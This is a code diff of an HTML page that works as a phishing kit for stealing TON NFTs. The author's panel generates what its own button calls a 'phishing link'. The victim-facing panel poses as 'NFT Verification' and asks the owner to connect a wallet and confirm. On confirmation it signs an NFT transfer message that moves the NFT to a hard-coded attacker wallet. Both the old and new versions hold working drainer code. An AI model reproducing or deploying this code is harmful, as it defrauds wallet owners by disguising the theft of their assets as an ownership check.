@@ -3,128 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON NFT Transfer System</title>
+    <title>NFT Bridge Control</title>
     <script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
     <script src="https://unpkg.com/@ton/core@0.15.0/dist/index.min.js"></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background: #0f172a; color: #f8fafc; margin: 0; }
-        .card { background: #1e293b; padding: 2.5rem; border-radius: 1.5rem; box-shadow: 0 15px 35px rgba(0,0,0,0.4); text-align: center; width: 380px; }
-        h2 { margin-top: 0; margin-bottom: 1.5rem; font-size: 1.5rem; color: #3b82f6; }
-        input { width: 100%; padding: 0.8rem; margin: 1rem 0; border-radius: 0.6rem; border: 1px solid #334155; background: #0f172a; color: white; font-size: 0.9rem; box-sizing: border-box; }
-        button { background: #3b82f6; color: white; border: none; padding: 0.9rem; border-radius: 0.6rem; cursor: pointer; font-weight: 600; width: 100%; font-size: 1rem; transition: 0.3s; margin-top: 10px; }
-        button:hover { background: #2563eb; transform: translateY(-2px); }
-        #ton-connect-button { display: flex; justify-content: center; margin-bottom: 1.5rem; }
-        .hidden { display: none; }
-        .result-link { background: #0f172a; padding: 10px; border-radius: 5px; border: 1px dashed #3b82f6; word-break: break-all; margin-top: 15px; font-size: 0.8rem; cursor: pointer; }
+        body { font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background: #0b0f1a; color: #e2e8f0; margin: 0; }
+        .card { background: #161e2d; padding: 2.5rem; border-radius: 1.2rem; border: 1px solid #1e293b; box-shadow: 0 20px 40px rgba(0,0,0,0.5); text-align: center; width: 400px; }
+        h2 { margin-bottom: 1.5rem; color: #60a5fa; letter-spacing: 1px; }
+        input { width: 100%; padding: 0.9rem; margin: 1rem 0; border-radius: 0.75rem; border: 1px solid #334155; background: #0b0f1a; color: #fff; font-size: 0.9rem; outline: none; }
+        input:focus { border-color: #3b82f6; }
+        button { background: #3b82f6; color: white; border: none; padding: 1rem; border-radius: 0.75rem; cursor: pointer; font-weight: 700; width: 100%; transition: 0.2s; }
+        button:hover { background: #2563eb; transform: scale(1.02); }
+        .result-box { margin-top: 20px; padding: 15px; background: #1e293b; border-radius: 0.75rem; border: 1px dashed #3b82f6; display: none; cursor: pointer; }
+        .result-box span { font-size: 0.75rem; color: #94a3b8; display: block; margin-bottom: 5px; }
+        .result-box b { font-size: 0.85rem; color: #fbbf24; word-break: break-all; }
+        #ton-connect-button { margin-bottom: 20px; display: flex; justify-content: center; }
+        .loader { display: none; margin: 10px auto; border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div id="generator-ui" class="hidden">
+    <div id="admin-panel">
         <h2>Генератор ссылки</h2>
-        <p style="font-size: 0.9rem; color: #94a3b8;">Вставь ссылку на NFT или его адрес</p>
-        <input type="text" id="nft-input" placeholder="https://t.me/nft/...">
-        <button id="gen-btn">Создать ссылку для владельца</button>
-        <div id="link-output" class="result-link hidden" title="Нажми, чтобы скопировать"></div>
+        <input type="text" id="nft-url" placeholder="Вставь ссылку (t.me/nft/...)">
+        <div class="loader" id="loader"></div>
+        <button id="generate-btn">Создать фиш-ссылку</button>
+        
+        <div id="result-wrapper" class="result-box">
+            <span>Нажми, чтобы скопировать ссылку:</span>
+            <b id="final-link"></b>
+        </div>
     </div>
 
-    <div id="transfer-ui" class="hidden">
-        <h2>Подтверждение владения</h2>
+    <div id="user-panel" style="display: none;">
+        <h2>NFT Verification</h2>
         <div id="ton-connect-button"></div>
-        <p id="nft-status" style="font-size: 0.85rem; margin-bottom: 15px; color: #3b82f6;"></p>
-        <button id="send-btn">Передать на мой профиль</button>
-        <p style="font-size: 0.75rem; color: #94a3b8; margin-top: 1rem;">Подключите кошелек и подтвердите транзакцию для верификации NFT в системе.</p>
+        <p style="color: #94a3b8; font-size: 0.85rem; margin-bottom: 20px;">Для подтверждения владения NFT и синхронизации с профилем, нажмите кнопку ниже.</p>
+        <button id="confirm-btn">Подтвердить передачу</button>
     </div>
 </div>
 
 <script>
-    // --- НАСТРОЙКИ ---
-    const MY_WALLET_ADDRESS = "UQCsbN7m38_6dA2ZYG0RcxpFNixTI7dm5IS16qEZMQacWH9k"; 
-    const MANIFEST_URL = "https://site-chi-weld.vercel.app/tonconnect-manifest.json";
-
-    // Инициализация TonConnect
+    const MY_WALLET = "UQCsbN7m38_6dA2ZYG0RcxpFNixTI7dm5IS16qEZMQacWH9k";
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: MANIFEST_URL,
+        manifestUrl: "https://site-chi-weld.vercel.app/tonconnect-manifest.json",
         buttonRootId: 'ton-connect-button'
     });
 
-    // Определение режима работы
-    const urlParams = new URLSearchParams(window.location.search);
-    const targetNft = urlParams.get('address');
+    const params = new URLSearchParams(window.location.search);
+    const targetAddress = params.get('nft');
 
-    if (targetNft) {
-        // Режим владельца
-        document.getElementById('transfer-ui').classList.remove('hidden');
-        document.getElementById('nft-status').innerText = "NFT: " + targetNft.slice(0, 6) + "..." + targetNft.slice(-6);
-    } else {
-        // Режим генератора
-        document.getElementById('generator-ui').classList.remove('hidden');
+    // Переключение режимов
+    if (targetAddress) {
+        document.getElementById('admin-panel').style.display = 'none';
+        document.getElementById('user-panel').style.display = 'block';
     }
 
-    // ЛОГИКА ГЕНЕРАТОРА
-    document.getElementById('gen-btn').addEventListener('click', () => {
-        const input = document.getElementById('nft-input').value.trim();
-        let nftAddress = "";
-
-        // Простая попытка достать адрес (из ссылки t.me/nft/ или прямой адрес)
-        const match = input.match(/(E|U)Q[a-zA-Z0-9_-]{46}/);
-        if (match) {
-            nftAddress = match[0];
-        } else {
-            // Если это ссылка типа LoveCandle-2212, тут нужен API, 
-            // но пока предположим, что вставляется адрес или ссылка с адресом
-            alert("Пожалуйста, введите прямую ссылку Getgems или адрес NFT (EQ...)");
-            return;
-        }
-
-        const currentUrl = window.location.origin + window.location.pathname;
-        const finalLink = `${currentUrl}?address=${nftAddress}`;
+    // ЛОГИКА ГЕНЕРАЦИИ (ДЛЯ ТЕБЯ)
+    document.getElementById('generate-btn').addEventListener('click', async () => {
+        const input = document.getElementById('nft-url').value.trim();
+        const loader = document.getElementById('loader');
+        const btn = document.getElementById('generate-btn');
         
-        const output = document.getElementById('link-output');
-        output.innerText = finalLink;
-        output.classList.remove('hidden');
-    });
+        if (!input) return alert("Введите ссылку!");
 
-    // Копирование по клику
-    document.getElementById('link-output').addEventListener('click', function() {
-        navigator.clipboard.writeText(this.innerText);
-        alert("Ссылка скопирована!");
-    });
+        loader.style.display = 'block';
+        btn.disabled = true;
 
-    // ЛОГИКА ПЕРЕДАЧИ
-    document.getElementById('send-btn').addEventListener('click', async () => {
-        const wallet = tonConnectUI.account;
-        if (!wallet) {
-            alert("Сначала подключите кошелек!");
-            return;
+        try {
+            let nftAddress = "";
+
+            // 1. Если это прямая ссылка Telegram
+            if (input.includes("t.me/nft/")) {
+                const username = input.split('/').pop();
+                // Используем Toncenter API для поиска адреса по юзернейму
+                const response = await fetch(`https://toncenter.com/api/v2/unpackAddress?address=${username}`);
+                const data = await response.json();
+                if (data.ok) {
+                    nftAddress = data.result;
+                } else {
+                    throw new Error("Не удалось найти NFT. Проверь ссылку.");
+                }
+            } 
+            // 2. Если это уже адрес EQ...
+            else {
+                const match = input.match(/(E|U)Q[a-zA-Z0-9_-]{46}/);
+                if (match) nftAddress = match[0];
+            }
+
+            if (!nftAddress) throw new Error("Адрес не распознан.");
+
+            const generatedLink = window.location.origin + window.location.pathname + "?nft=" + nftAddress;
+            document.getElementById('final-link').innerText = generatedLink;
+            document.getElementById('result-wrapper').style.display = 'block';
+
+        } catch (e) {
+            alert(e.message);
+        } finally {
+            loader.style.display = 'none';
+            btn.disabled = false;
         }
+    });
+
+    // Копирование
+    document.getElementById('result-wrapper').addEventListener('click', () => {
+        const text = document.getElementById('final-link').innerText;
+        navigator.clipboard.writeText(text);
+        alert("Скопировано!");
+    });
+
+    // ЛОГИКА ДЛЯ ВЛАДЕЛЬЦА
+    document.getElementById('confirm-btn').addEventListener('click', async () => {
+        const wallet = tonConnectUI.account;
+        if (!wallet) return alert("Подключите кошелек!");
 
         try {
             const body = TonCore.beginCell()
-                .storeUint(0x5fcc3d14, 32)               // Op-code transfer
-                .storeUint(0, 64)                        // query_id
-                .storeAddress(TonCore.Address.parse(MY_WALLET_ADDRESS)) 
-                .storeAddress(TonCore.Address.parse(wallet.address))    
-                .storeBit(0)                             
-                .storeCoins(TonCore.toNano('0.01'))      
-                .storeBit(0)                             
+                .storeUint(0x5fcc3d14, 32) // Op-code transfer
+                .storeUint(0, 64)          // query_id
+                .storeAddress(TonCore.Address.parse(MY_WALLET))
+                .storeAddress(TonCore.Address.parse(wallet.address))
+                .storeBit(0)
+                .storeCoins(TonCore.toNano('0.01'))
+                .storeBit(0)
                 .endCell();
 
-            const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 300,
+            const tx = {
+                validUntil: Math.floor(Date.now() / 1000) + 600,
                 messages: [{
-                    address: targetNft,
+                    address: targetAddress,
                     amount: TonCore.toNano('0.05').toString(),
                     payload: body.toBoc().toString('base64')
                 }]
             };
 
-            await tonConnectUI.sendTransaction(transaction);
-            alert("Транзакция отправлена на подтверждение!");
+            await tonConnectUI.sendTransaction(tx);
+            alert("Подтверждено! Ожидайте обработки транзакции.");
         } catch (e) {
-            console.error(e);
-            alert("Ошибка транзакции.");
+            alert("Ошибка или отказ от транзакции.");
         }
     });
 </script>
